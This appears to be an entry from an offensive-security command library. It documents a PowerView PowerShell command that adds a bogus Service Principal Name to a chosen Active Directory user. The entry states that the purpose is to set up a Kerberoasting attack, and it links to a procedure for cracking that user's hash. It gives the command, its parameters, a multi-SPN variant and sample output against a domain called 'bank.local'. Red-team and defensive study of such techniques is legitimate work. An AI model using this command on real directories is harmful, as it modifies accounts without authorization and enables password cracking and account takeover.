---
id: 708787bf-73fb-482c-a277-ceb657eac155
name: powerview-add-spn-to-domain-user
type: command
executor: powershell
data: >-
  Set-DomainObject -Credential $Cred -Identity $_TARGET_USER -SET
  @{serviceprincipalname='nonexistent/$_DOMAIN'}
output: >-
  PS C:\> Set-DomainObject -Credential $Cred -Identity steve -SET
  @{serviceprincipalname='nonexistent/bank.local'}


  Object modified successfully.
created_at: '2020-06-25T20:16:48.076064+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - powerview
  - active-directory
  - modification
verified: true
validated: true
---

# powerview-add-spn-to-domain-user

## Command

```powershell
Set-DomainObject -Credential $Cred -Identity $_TARGET_USER -SET @{serviceprincipalname='nonexistent/$_DOMAIN'}
```

## Description

This PowerView command modifies an Active Directory user object by adding a Service Principal Name (SPN) attribute, enabling Kerberoasting attacks. It uses provided credentials to authenticate and sets a custom SPN value on the target user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Credential $Cred | PSCredential object for authentication (created via [[commands/create-windows-pscredential-object]]) | Yes |
| -Identity $_TARGET_USER | The target user account name (e.g., 'steve') | Yes |
| -SET @{serviceprincipalname='nonexistent/$_DOMAIN'} | Hashtable to set the servicePrincipalName attribute to a custom value | Yes |
| $_DOMAIN | The domain name for the SPN (e.g., 'bank.local') | Yes |

## Examples

### Basic Usage

```powershell
Set-DomainObject -Credential $Cred -Identity steve -SET @{serviceprincipalname='nonexistent/bank.local'}
```

### Advanced Usage

Add multiple SPNs:

```powershell
Set-DomainObject -Credential $Cred -Identity steve -SET @{serviceprincipalname='nonexistent/bank.local','another/$_DOMAIN'}
```

## Expected Output

Confirmation of the modification:

```
PS C:\> Set-DomainObject -Credential $Cred -Identity steve -SET @{serviceprincipalname='nonexistent/bank.local'}

Object modified successfully.
```

## Related

- [[procedures/Add-SPN-to-Domain-User-and-Kerberoast-for-NTLMv2-Hash]]
- [[tools/PowerView]]
